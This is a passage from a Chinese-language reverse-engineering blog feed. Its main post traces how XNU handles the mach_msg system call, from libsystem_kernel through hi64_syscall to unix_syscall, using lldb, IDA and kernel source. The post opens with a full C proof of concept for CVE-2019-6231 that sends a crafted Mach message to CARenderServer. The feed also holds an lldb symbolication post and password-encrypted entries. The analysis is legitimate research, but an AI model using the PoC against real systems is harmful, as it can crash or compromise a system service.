style="display:none">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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Welcome to my blog, enter password to read.
    
    </summary>
    
      <category term="me" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/me/"/>
    
    
  </entry>
  
  <entry>
    <title>XNU系统调用深度解析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/01/30/XNU%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90/XNU%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/01/30/XNU系统调用深度解析/XNU系统调用深度解析/</id>
    <published>2019-01-30T05:53:00.000Z</published>
    <updated>2019-03-05T15:30:52.474Z</updated>
    
    <content type="html"><![CDATA[<h3 id="XNU系统调用深度解析"><a href="#XNU系统调用深度解析" class="headerlink" title="XNU系统调用深度解析"></a>XNU系统调用深度解析</h3><blockquote><p>从一个函数分析到系统调用的内核实现</p></blockquote><h4 id="由一段POC而起"><a href="#由一段POC而起" class="headerlink" title="由一段POC而起"></a>由一段POC而起</h4><pre><code class="c">#include &lt;stdio.h&gt;#include &lt;mach/i386/kern_return.h&gt;#include &lt;mach/mach_traps.h&gt;#include &lt;servers/bootstrap.h&gt;#include &lt;dirent.h&gt;#include &lt;sys/stat.h&gt;#include &lt;time.h&gt;#include &lt;dlfcn.h&gt;#include &lt;unistd.h&gt;typedef struct quartz_register_client_s quartz_register_client_t;struct quartz_register_client_s {        mach_msg_header_t header;        uint32_t body;        mach_msg_port_descriptor_t ports[4];        char padding[12];};typedef struct quartzcore_mach_msg quartzcore_mach_msg_t;struct quartzcore_mach_msg{        mach_msg_header_t header;        char msg_body[712];};uint64_t get_filesize(const char *fn){        struct stat st;        stat(fn, &amp;st);        uint64_t fsize = st.st_size;        return fsize;};int main(int argc, const char * argv[]) {        mach_port_t p = MACH_PORT_NULL, bs_port = MACH_PORT_NULL;        task_get_bootstrap_port(mach_task_self(), &amp;bs_port);        const char *render_service_name = &quot;com.apple.CARenderServer&quot;;        kern_return_t (*bootstrap_look_up)(mach_port_t, const char *, mach_port_t *) = dlsym(RTLD_DEFAULT, &quot;bootstrap_look_up&quot;);        kern_return_t kr = bootstrap_look_up(bs_port, render_service_name, &amp;p);        if (kr != KERN_SUCCESS) {                return -1;        }        printf(&quot;[*] Get service of %s successully!\n&quot;, render_service_name);        quartz_register_client_t msg_register;        memset(&amp;msg_register, 0, sizeof(msg_register));        msg_register.header.msgh_bits =        MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE) |        MACH_MSGH_BITS_COMPLEX;        msg_register.header.msgh_remote_port = p;        msg_register.header.msgh_local_port = mig_get_reply_port();        msg_register.header.msgh_id = 40202;  // _XRegisterClient        msg_register.body = 4;        msg_register.ports[0].name = mach_task_self();        msg_register.ports[0].disposition = MACH_MSG_TYPE_COPY_SEND;        msg_register.ports[0].type = MACH_MSG_PORT_DESCRIPTOR;        msg_register.ports[1].name = mach_task_self();        msg_register.ports[1].disposition = MACH_MSG_TYPE_COPY_SEND;        msg_register.ports[1].type = MACH_MSG_PORT_DESCRIPTOR;        msg_register.ports[2].name = mach_task_self();        msg_register.ports[2].disposition = MACH_MSG_TYPE_COPY_SEND;        msg_register.ports[2].type = MACH_MSG_PORT_DESCRIPTOR;        msg_register.ports[3].name = mach_task_self();        msg_register.ports[3].disposition = MACH_MSG_TYPE_COPY_SEND;        msg_register.ports[3].type = MACH_MSG_PORT_DESCRIPTOR;        kr = mach_msg(&amp;msg_register.header, MACH_SEND_MSG | MACH_RCV_MSG,                                    sizeof(quartz_register_client_t), sizeof(quartz_register_client_t),                                    msg_register.header.msgh_local_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);        if (kr != KERN_SUCCESS) {                return -1 ;        }        mach_port_t context_port = *(uint32_t *)((uint8_t *)&amp;msg_register + 0x1c);        uint32_t conn_id = *(uint32_t *)((uint8_t *)&amp;msg_register + 0x30);        printf(&quot;[*] context_port: 0x%x, conn_id: 0x%x\n&quot;,context_port,conn_id);        char *crash_log = &quot;crash.data&quot;; //size is 736.        FILE *fp = fopen(crash_log, &quot;rb&quot;);        if(fp == NULL){                printf(&quot;fopen error!\n&quot;);        }        uint64_t fsize = get_filesize(crash_log);        void *msg_buf = malloc(fsize);        memset(msg_buf, 0, fsize);        fread(msg_buf, fsize, 1, fp);        quartzcore_mach_msg_t qc_mach_msg = {0};        qc_mach_msg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;        qc_mach_msg.header.msgh_remote_port = context_port;        qc_mach_msg.header.msgh_id = 40002;        memset(qc_mach_msg.msg_body, 0x0, sizeof(qc_mach_msg.msg_body));        *(uint32_t *)(qc_mach_msg.msg_body + 0) = 0x1;  // Ports count        memcpy(qc_mach_msg.msg_body+4+12, msg_buf+0x1c+0xc, 736-0x1c-0xc);        *(uint32_t *)(qc_mach_msg.msg_body + 4 + 12 + 4) = conn_id;        kr = mach_msg(&amp;qc_mach_msg.header, MACH_SEND_MSG,736, 0, 0, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);        if (kr != KERN_SUCCESS) {                printf(&quot;[-] Send message failed: 0x%d\n&quot;, kr);                return -1 ;        }        return 0;}</code></pre><p>里面的macho函数<code>mach_msg()</code>到底后面执行到哪里？于是展开一段追踪</p><p>从ida的导入表中可以看到这个函数实现在libSystem.B.dylib 顺便说下，这个动态库实际上只是一层封装，里面导入了/usr/lib/system下面的动态库。</p><pre><code class="assembly">* thread #1, queue = &#39;com.apple.main-thread&#39;, stop reason = breakpoint 2.1    frame #0: 0x00007fff79299694 libsystem_kernel.dylib`mach_msglibsystem_kernel.dylib`mach_msg:-&gt;  0x7fff79299694 &lt;+0&gt;: pushq  %rbp    0x7fff79299695 &lt;+1&gt;: movq   %rsp, %rbp    0x7fff79299698 &lt;+4&gt;: pushq  %r15    0x7fff7929969a &lt;+6&gt;: pushq  %r14Target 0: (CVE-2019-6231-poc) stopped.</code></pre><p>调试可以看出mach_msg实现在libsystem_kernel.dylib之中</p><pre><code class="assembly">(lldb) dislibsystem_kernel.dylib`mach_msg:-&gt;  0x7fff79299694 &lt;+0&gt;:   pushq  %rbp    0x7fff79299695 &lt;+1&gt;:   movq   %rsp, %rbp    0x7fff79299698 &lt;+4&gt;:   pushq  %r15    0x7fff7929969a &lt;+6&gt;:   pushq  %r14    0x7fff7929969c &lt;+8&gt;:   pushq  %r13    0x7fff7929969e &lt;+10&gt;:  pushq  %r12    0x7fff792996a0 &lt;+12&gt;:  pushq  %rbx    0x7fff792996a1 &lt;+13&gt;:  subq   $0x28, %rsp    0x7fff792996a5 &lt;+17&gt;:  movl   %ecx, %r13d    0x7fff792996a8 &lt;+20&gt;:  movl   %esi, %ebx    0x7fff792996aa &lt;+22&gt;:  movq   %rdi, %r14    0x7fff792996ad &lt;+25&gt;:  movl   0x10(%rbp), %eax    0x7fff792996b0 &lt;+28&gt;:  movl   %ebx, %r12d    0x7fff792996b3 &lt;+31&gt;:  andl   $0xfffffbbf, %r12d        ; imm = 0xFFFFFBBF     0x7fff792996ba &lt;+38&gt;:  movl   %eax, (%rsp)    0x7fff792996bd &lt;+41&gt;:  movl   %r12d, %esi    0x7fff792996c0 &lt;+44&gt;:  movl   %edx, %r15d    0x7fff792996c3 &lt;+47&gt;:  movl   %r8d, -0x2c(%rbp)    0x7fff792996c7 &lt;+51&gt;:  movl   %r9d, -0x30(%rbp)    0x7fff792996cb &lt;+55&gt;:  callq  0x7fff79299170            ; mach_msg_trap    ...</code></pre><pre><code class="c">mach_msg_return_t __cdecl mach_msg(mach_msg_header_t *msg, mach_msg_option_t option, mach_msg_size_t send_size, mach_msg_size_t rcv_size, mach_port_name_t rcv_name, mach_msg_timeout_t timeout, mach_port_name_t notify){  mach_msg_return_t result; // eax  mach_msg_option_t v8; // er12  result = mach_msg_trap();  if ( !result )    return 0;  if ( !(option &amp; 0x40) &amp;&amp; result == 268435463 )  {    do      result = mach_msg_trap();    while ( result == 268435463 );  }  v8 = option;  if ( !_bittest(&amp;v8, 0xAu) &amp;&amp; result == 268451845 )  {    do      result = mach_msg_trap();    while ( result == 268451845 );  }  return result;}</code></pre><p>通过调式和ida反汇编mach_msg函数可以看出，最终会调用mach_msg_trap这个函数，再跟一下</p><pre><code class="assembly">* thread #1, queue = &#39;com.apple.main-thread&#39;, stop reason = breakpoint 3.1    frame #0: 0x00007fff79299170 libsystem_kernel.dylib`mach_msg_traplibsystem_kernel.dylib`mach_msg_trap:-&gt;  0x7fff79299170 &lt;+0&gt;:  movq   %rcx, %r10    0x7fff79299173 &lt;+3&gt;:  movl   $0x100001f, %eax          ; imm = 0x100001F     0x7fff79299178 &lt;+8&gt;:  syscall     0x7fff7929917a &lt;+10&gt;: retq   Target 0: (CVE-2019-6231-poc) stopped.</code></pre><p>这个函数后面会调用0x100001f系统调用，可以小结得到系统库封装了最底层的实现，最终通过系统调用进入内核。在用户层到这里已经就到头了，无法再跟进。</p><h4 id="XNU内核系统调用流程"><a href="#XNU内核系统调用流程" class="headerlink" title="XNU内核系统调用流程"></a>XNU内核系统调用流程</h4><p>系统调用发生在内核之中，那么最开始处理系统调用的地方又在哪？通过<a href="http://www.intel.com/content/www/us/en/processors/architectures-software-developer-manuals.html" target="_blank" rel="external">intel官方文档</a>可以找到</p><pre><code>SYSCALL invokes an OS system-call handler at privilege level 0.It does so by loading RIP from the IA32_LSTAR MSR</code></pre><p>也就是内核需要将系统调用处理函数入口放到<code>IA32_LSTAR</code> <a href="https://en.wikipedia.org/wiki/Model-specific_register" target="_blank" rel="external">model specific register</a>. 在内核源码中对应在<code>osfmk/i386/mp_desc.c</code>的<code>cpu_syscall_init(cpu_data_t *cdp)</code>函数之中</p><pre><code class="c">/* * Set MSRs for sysenter/sysexit and syscall/sysret for 64-bit. */voidcpu_syscall_init(cpu_data_t *cdp){#if MONOTONIC    mt_cpu_up(cdp);#else /* MONOTONIC */#pragma unused(cdp)#endif /* !MONOTONIC */    wrmsr64(MSR_IA32_SYSENTER_CS, SYSENTER_CS);     wrmsr64(MSR_IA32_SYSENTER_EIP, DBLMAP((uintptr_t) hi64_sysenter));    wrmsr64(MSR_IA32_SYSENTER_ESP, current_cpu_datap()-&gt;cpu_desc_index.cdi_sstku);    /* Enable syscall/sysret */    wrmsr64(MSR_IA32_EFER, rdmsr64(MSR_IA32_EFER) | MSR_IA32_EFER_SCE);    /*     * MSRs for 64-bit syscall/sysret     * Note USER_CS because sysret uses this + 16 when returning to     * 64-bit code.     */    wrmsr64(MSR_IA32_LSTAR, DBLMAP((uintptr_t) hi64_syscall));    wrmsr64(MSR_IA32_STAR, (((uint64_t)USER_CS) &lt;&lt; 48) | (((uint64_t)KERNEL64_CS) &lt;&lt; 32));    /*     * Emulate eflags cleared by sysenter but note that     * we also clear the trace trap to avoid the complications     * of single-stepping into a syscall. The nested task bit     * is also cleared to avoid a spurious &quot;task switch&quot;     * should we choose to return via an IRET.     */    wrmsr64(MSR_IA32_FMASK, EFL_DF|EFL_IF|EFL_TF|EFL_NT);}</code></pre><p><code>wrmsr64(MSR_IA32_LSTAR, DBLMAP((uintptr_t) hi64_syscall));</code>也就是系统调用会由<code>hi64_syscall</code>函数处理。这个函数实现在<code>xnu/osfmk/x86_64/idt64.s</code>之中</p><pre><code class="assembly">Entry(hi64_syscall)Entry(idt64_syscall)    swapgs     /* Use RAX as a temporary by shifting its contents into R11[32:63]      * The systemcall number is defined to be a 32-bit quantity, as is      * RFLAGS.      */    shlq    $32, %rax    or     %rax, %r11.globl EXT(dblsyscall_patch_point)EXT(dblsyscall_patch_point)://    movabsq    $0x12345678ABCDEFFFULL, %rax     /* Generate offset to the double-mapped per-CPU data shadow      * into RAX      */    leaq    EXT(idt64_hndl_table0)(%rip), %rax    mov    16(%rax), %rax    mov     %rsp, %gs:CPU_UBER_TMP(%rax)  /* save user stack */    mov     %gs:CPU_ESTACK(%rax), %rsp  /* switch stack to per-cpu estack */    sub    $(ISF64_SIZE), %rsp    /*     * Synthesize an ISF frame on the exception stack     */    movl    $(USER_DS), ISF64_SS(%rsp)    mov    %rcx, ISF64_RIP(%rsp)        /* rip */    mov    %gs:CPU_UBER_TMP(%rax), %rcx    mov    %rcx, ISF64_RSP(%rsp)        /* user stack --changed */    mov    %r11, %rax    shrq    $32, %rax        /* Restore RAX */    mov    %r11d, %r11d        /* Clear r11[32:63] */    mov    %r11, ISF64_RFLAGS(%rsp)    /* rflags */    movl    $(SYSCALL_CS), ISF64_CS(%rsp)    /* cs - a pseudo-segment */    mov    %rax, ISF64_ERR(%rsp)        /* err/rax - syscall code */    movq    $(HNDL_SYSCALL), ISF64_TRAPFN(%rsp)    movq    $(T_SYSCALL), ISF64_TRAPNO(%rsp)    /* trapno */    swapgs    jmp    L_dispatch            /* this can only be 64-bit */</code></pre><p>继续跟下去，会得到如下执行流程</p><pre><code>syscall--&gt;hi64_syscall-&gt;L_dispatch--&gt;ks_dispatch--&gt;ks_dispatch_user--&gt;L_dispatch_U64--&gt;L_dispatch_64bit--&gt;L_common_dispatch--&gt;hndl_syscall</code></pre><pre><code class="assembly">/* * 64bit Tasks * System call entries via syscall only: * *    r15     x86_saved_state64_t *    rsp     kernel stack * *    both rsp and r15 are 16-byte aligned *    interrupts disabled *    direction flag cleared */Entry(hndl_syscall)    TIME_TRAP_UENTRY    movq    %gs:CPU_ACTIVE_THREAD,%rcx    /* get current thread     */    movl    $-1, TH_IOTIER_OVERRIDE(%rcx)    /* Reset IO tier override to -1 before handling syscall */    movq    TH_TASK(%rcx),%rbx        /* point to current task  */    /* Check for active vtimers in the current task */    TASK_VTIMER_CHECK(%rbx,%rcx)    /*     * We can be here either for a mach, unix machdep or diag syscall,     * as indicated by the syscall class:     */    movl    R64_RAX(%r15), %eax        /* syscall number/class */    movl    %eax, %edx    andl    $(SYSCALL_CLASS_MASK), %edx    /* syscall class */    cmpl    $(SYSCALL_CLASS_MACH&lt;&lt;SYSCALL_CLASS_SHIFT), %edx    je    EXT(hndl_mach_scall64)    cmpl    $(SYSCALL_CLASS_UNIX&lt;&lt;SYSCALL_CLASS_SHIFT), %edx    je    EXT(hndl_unix_scall64)    cmpl    $(SYSCALL_CLASS_MDEP&lt;&lt;SYSCALL_CLASS_SHIFT), %edx    je    EXT(hndl_mdep_scall64)    cmpl    $(SYSCALL_CLASS_DIAG&lt;&lt;SYSCALL_CLASS_SHIFT), %edx    je    EXT(hndl_diag_scall64)    /* Syscall class unknown */    sti    CCALL3(i386_exception, $(EXC_SYSCALL), %rax, $1)    /* no return */</code></pre><p><code>hndl_syscall</code>这个函数会系统调用分为<code>hndl_unix_scall64</code> 、<code>hndl_mach_scall64</code>、<code>hndl_mdep_scall64</code>、<code>hndl_diag_scall64</code>四类分别处理</p><p>这里以<code>hndl_unix_scall64</code>为列</p><pre><code class="assembly">Entry(hndl_unix_scall)        TIME_TRAP_UENTRY    movq    %gs:CPU_ACTIVE_THREAD,%rcx    /* get current thread     */    movq    TH_TASK(%rcx),%rbx        /* point to current task  */    incl    TH_SYSCALLS_UNIX(%rcx)        /* increment call count   */    /* Check for active vtimers in the current task */    TASK_VTIMER_CHECK(%rbx,%rcx)    sti    CCALL1(unix_syscall, %r15)    /*     * always returns through thread_exception_return     */</code></pre><p>这里调动了<code>unix_syscall</code>函数，这个函数在bsd/dev/i386/systemcalls.c之中实现，里面进行了一些权限检查</p><p>以及根据系统调用表去调用对应的实现</p><pre><code class="c">  thread = current_thread();  uthread = get_bsdthread_info(thread);  // regs is derrived from r15 ...  code = regs-&gt;rax &amp; SYSCALL_NUMBER_MASK;  callp = (code &gt;= NUM_SYSENT) ? &amp;sysent[63] : &amp;sysent[code];  // ...  vt = (void *)uthread-&gt;uu_arg;  // ...  memcpy(vt, args_start_at_rdi ? &amp;regs-&gt;rdi : &amp;regs-&gt;rsi,        args_in_regs * sizeof(syscall_arg_t));  // ...  error = (*(callp-&gt;sy_call))((void *)p, vt, &amp;(uthread-&gt;uu_rval[0]));</code></pre><p>目前执行的流程如下</p><pre><code>hi64_syscallL_dispatch_U64L_dispatch_64bitL_common_dispatchhndl_syscall // rdx, pushed in hi64_syscallhndl_unix_scall64unix_syscall64error = (*(callp-&gt;sy_call))((void *)p, vt, &amp;(uthread-&gt;uu_rval[0])); // now we&#39;re there</code></pre><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://www.binss.me/blog/interrupt-and-exception/" target="_blank" rel="external">https://www.binss.me/blog/interrupt-and-exception/</a></p><p><a href="https://0xax.gitbooks.io/linux-insides/content/SysCall/linux-syscall-2.html" target="_blank" rel="external">https://0xax.gitbooks.io/linux-insides/content/SysCall/linux-syscall-2.html</a></p><p><a href="https://gist.github.com/yrp604/23e86dce9ca12bf514ef" target="_blank" rel="external">https://gist.github.com/yrp604/23e86dce9ca12bf514ef</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;XNU系统调用深度解析&quot;&gt;&lt;a href=&quot;#XNU系统调用深度解析&quot; class=&quot;headerlink&quot; title=&quot;XNU系统调用深度解析&quot;&gt;&lt;/a&gt;XNU系统调用深度解析&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;从一个函数分析到系统调用的内核实现&lt;/p&gt;
      
    
    </summary>
    
      <category term="iOSRE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/iOSRE/"/>
    
    
      <category term="XNU" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/XNU/"/>
    
      <category term="Kernel" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Kernel/"/>
    
  </entry>
  
  <entry>
    <title>LLDB调试器栈符号化</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2018/10/03/xia0LLDB/xia0LLDB/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2018/10/03/xia0LLDB/xia0LLDB/</id>
    <published>2018-10-03T05:27:59.000Z</published>
    <updated>2019-02-21T10:07:17.274Z</updated>
    
    <content type="html"><![CDATA[<h3 id="强化你的lldb调试器"><a href="#强化你的lldb调试器" class="headerlink" title="强化你的lldb调试器"></a>强化你的lldb调试器</h3><h3 id="Why"><a href="#Why" class="headerlink" title="Why?"></a>Why?</h3><p>lldb作为苹果iOS和macOS的调试器在正向开发中十分强大，不过对于逆向人员来说却不是很友好。尤其是那些符号表被strip以后的执行文件。去定位追溯一个函数的执行流程时，查看当前的栈帧只有一堆内存地址，如果要定位是哪个函数通常的流程就是找到当前模块的内存偏移，然后栈上的地址逐一减去改偏移然后去ida中查找改地址，最后才能定位到函数名。流程琐碎且都是重复工作，花费大量时间去定位符号信息。因此我想做一个能自动恢复栈帧符号的命令。只要输入改命令就能显示函数的调用情况。</p><h3 id="How"><a href="#How" class="headerlink" title="How?"></a>How?</h3><p>但是符号表都已经被strip了怎么才能恢复符号呢？我的想法就是macho可执行文件中其实是有很大一部分段储存的OC函数信息，里面肯定是有类名和方法名的，我们要做的就是通过栈中的地址，遍历所有的类以及方法，找到最佳的类方法即可。判断原则就是找到距离栈地址最近且小于等于栈地址的类方法。然后记录类名和方法名即可。</p><p>正好lldb提供了python的接口，可以开发自定义的命令。</p><h3 id="And-what"><a href="#And-what" class="headerlink" title="And what ?"></a>And what ?</h3><p>虽然有python接口，但是lldb里面集成了一个OC的解释器，其语法要求特别严格，按照通常开发的写法会有很多错误，经过不断的调试和修复bug，一个开发版基于lldb python栈符号恢复命令开发完成。git地址在<a href="https://github.com/4ch12dy/xia0LLDB">这里</a></p><p>这里面还有的搜索算法以及异常处理还需要优化，以及对于block这类函数还不能恢复，不过对于大多数的场景目前还是可用。具体效果可以如下：</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/b_bt.jpg?raw=true" alt="https://github.com/4ch12dy/xia0LLDB/blob/master/resource/b_bt.jpg?raw=true"></p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/b_sbt.jpg?raw=true" alt="https://github.com/4ch12dy/xia0LLDB/blob/master/resource/b_sbt.jpg?raw=true"></p><h3 id="update"><a href="#update" class="headerlink" title="update"></a>update</h3><p>现已支持恢复block结构符号解析，通过提供的ida脚本，得到一个json格式的block符号文件，然后在lldb命令行中输入<code>sbt -f block-json-file-path</code>即可加载该文件。效果如下：</p><h4 id="原始的bt命令结果"><a href="#原始的bt命令结果" class="headerlink" title="原始的bt命令结果"></a>原始的bt命令结果</h4><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/orig_bt.png?raw=true" alt="orig_bt"></p><h4 id="sbt命令（没有加载block符号文件）"><a href="#sbt命令（没有加载block符号文件）" class="headerlink" title="sbt命令（没有加载block符号文件）"></a>sbt命令（没有加载block符号文件）</h4><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/sbt-noblockfile.png?raw=true" alt="sbt-noblockfile"></p><h4 id="sbt命令（带有block符号文件）"><a href="#sbt命令（带有block符号文件）" class="headerlink" title="sbt命令（带有block符号文件）"></a>sbt命令（带有block符号文件）</h4><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/sbt-blockfile.png?raw=true" alt="sbt-blockfile"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;强化你的lldb调试器&quot;&gt;&lt;a href=&quot;#强化你的lldb调试器&quot; class=&quot;headerlink&quot; title=&quot;强化你的lldb调试器&quot;&gt;&lt;/a&gt;强化你的lldb调试器&lt;/h3&gt;&lt;h3 id=&quot;Why&quot;&gt;&lt;a href=&quot;#Why&quot; class=&quot;he
      
    
    </summary>
    
      <category term="iOSRE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/iOSRE/"/>
    
    
      <category term="python" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/python/"/>
    
      <category term="LLDB" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/LLDB/"/>
    
  </entry>
  
  <entry>
    <title>unicorn</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2018/09/13/unicorn/unicorn/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2018/09/13/unicorn/unicorn/</id>
    <published>2018-09-13T06:39:03.000Z</published>
    <updated>2019-04-16T03:03:09.532Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="re" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/re/"/>
    
    
      <category term="unicorn" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/unicorn/"/>
    
  </entry>
  
  <entry>
    <title>reversing-dot-kr</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2018/04/29/reversing-dot-kr/reversing-dot-kr/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2018/04/29/reversing-dot-kr/reversing-dot-kr/</id>
    <published>2018-04-29T03:47:09.000Z</published>
    <updated>2019-04-29T11:47:36.495Z</updated>
    
